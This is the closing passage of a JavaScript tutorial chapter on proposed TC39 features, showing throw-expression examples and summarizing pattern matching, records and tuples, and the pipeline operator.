  b = throw new Error('Divisor cannot be undefined')
) => b !== 0 
  ? a / b 
  : throw new Error('Division by zero');
```

#### Nullish Coalescing

```javascript
// Currently
function getConfig(config) {
  const value = config?.apiKey;
  if (!value) {
    throw new Error('API key not configured');
  }
  return value;
}

// With throw expressions (proposed)
const getConfig = (config) =>
  config?.apiKey ?? throw new Error('API key not configured');

// Example: Environment variables
const API_KEY = process.env.API_KEY 
  ?? throw new Error('API_KEY environment variable required');

const PORT = Number(process.env.PORT) 
  || throw new Error('Invalid PORT');
```

#### Logical Operators

```javascript
// With AND operator
const value = condition && computeValue() 
  || throw new Error('Computation failed');

// Example: Object property access
const userName = user?.profile?.name 
  ?? throw new Error('User name not found');

// Example: Array access
const firstItem = array[0] 
  ?? throw new Error('Array is empty');
```

#### Arrow Functions

```javascript
// Concise validation
const validate = (input) =>
  input.length > 0 
    ? input 
    : throw new ValidationError('Input cannot be empty');

// Multiple conditions
const processAge = (age) =>
  age < 0 ? throw new RangeError('Age cannot be negative') :
  age > 150 ? throw new RangeError('Age too large') :
  age;

// Example: Factory function
const createLogger = (level) =>
  level === 'debug' ? new DebugLogger() :
  level === 'info' ? new InfoLogger() :
  level === 'error' ? new ErrorLogger() :
  throw new Error(`Unknown log level: ${level}`);
```

#### Pipeline Operator Integration

```javascript
// Throw in pipeline (with throw expressions)
const result = input
  |> validate
  |> (x => x || throw new Error('Validation failed'))
  |> transform
  |> (x => x.length > 0 ? x : throw new Error('Empty result'))
  |> format;

// Example: API request pipeline
const data = userId
  |> (id => id || throw new Error('User ID required'))
  |> fetchUser
  |> await %
  |> (user => user || throw new Error('User not found'))
  |> (user => user.active || throw new Error('User is inactive'))
  |> formatUserData;
```

#### Pattern Matching Integration

```javascript
// Throw in match expressions
const processValue = match (value) {
  when (x) if (x < 0) -> throw new RangeError('Negative value')
  when (x) if (x === 0) -> 0
  when (x) if (x > 0) -> Math.sqrt(x)
  default -> throw new TypeError('Invalid value')
};

// Example: HTTP status handling
const handleStatus = match (response.status) {
  when (200) -> response.data
  when (404) -> throw new NotFoundError('Resource not found')
  when (500) -> throw new ServerError('Server error')
  when (code) if (code >= 400 && code < 500) -> 
    throw new ClientError(`Client error: ${code}`)
  default -> 
    throw new Error(`Unexpected status: ${response.status}`)
};
```

#### Real-World Examples

```javascript
// Example 1: Configuration validation
class Config {
  constructor(options) {
    this.apiUrl = options?.apiUrl 
      ?? throw new Error('API URL required');
    
    this.timeout = options?.timeout 
      ?? 5000;
    
    this.retries = options?.retries >= 0 
      ? options.retries 
      : throw new RangeError('Retries must be non-negative');
  }
}

// Example 2: Database query
const findUser = (id) =>
  id 
    ? db.users.findById(id) 
      ?? throw new NotFoundError(`User ${id} not found`)
    : throw new ValidationError('User ID required');

// Example 3: Form validation
const validateForm = (form) => ({
  name: form.name?.trim() 
    || throw new ValidationError('Name is required'),
  
  email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email) 
    ? form.email 
    : throw new ValidationError('Invalid email'),
  
  age: form.age >= 18 
    ? form.age 
    : throw new ValidationError('Must be 18 or older')
});

// Example 4: Safe division
const safeDivide = (a, b) =>
  b !== 0 
    ? a / b 
    : throw new Error('Division by zero');

// Example 5: Object destructuring with validation
function processUser({ 
  id = throw new Error('ID required'),
  name = throw new Error('Name required'),
  email = throw new Error('Email required'),
  role = 'user'
}) {
  return { id, name, email, role };
}

// Example 6: Array operations
const firstOrThrow = (array) =>
  array.length > 0 
    ? array[0] 
    : throw new Error('Array is empty');

const lastOrThrow = (array) =>
  array.length > 0 
    ? array[array.length - 1] 
    : throw new Error('Array is empty');
```

---

## Summary

This document covered future JavaScript proposals:

**Pattern Matching (Stage 1):**

- Match expressions for conditional logic
- Destructuring patterns for objects and arrays
- Guards for conditional patterns
- Type patterns and range patterns
- Real-world examples (HTTP responses, Redux reducers, command parsers)

**Records and Tuples (Stage 2):**

- Immutable data structures with `#{}` and `#[]` syntax
- Deep immutability guarantees
- Value equality semantics
- Use cases (React state, Redux, configuration, caching)
- Conversion between objects/arrays and records/tuples

**Pipeline Operator (Stage 2):**

- Function chaining with `|>`
- Cleaner alternative to nested function calls
- Integration with async/await
- Side effects in pipelines
- Real-world examples (text processing, validation, data aggregation)

**Throw Expressions (Stage 2):**

- `throw` in expression contexts
- Use with ternary operators, default parameters, nullish coalescing
- Integration with arrow functions and pipelines
- Concise error handling patterns

These proposals aim to make JavaScript more expressive and maintainable.

---

**Tracking Proposals:**

- TC39 GitHub: https://github.com/tc39/proposals
- Stage Process: https://tc39.es/process-document/

**Experimenting:**

- Babel: Configure plugins for proposals
- TypeScript: Some proposals available in experimental mode
- Follow proposal repositories for updates

**Note:** Syntax and semantics may change as proposals evolve through the TC39 process.
---

**End of Chapter 25**

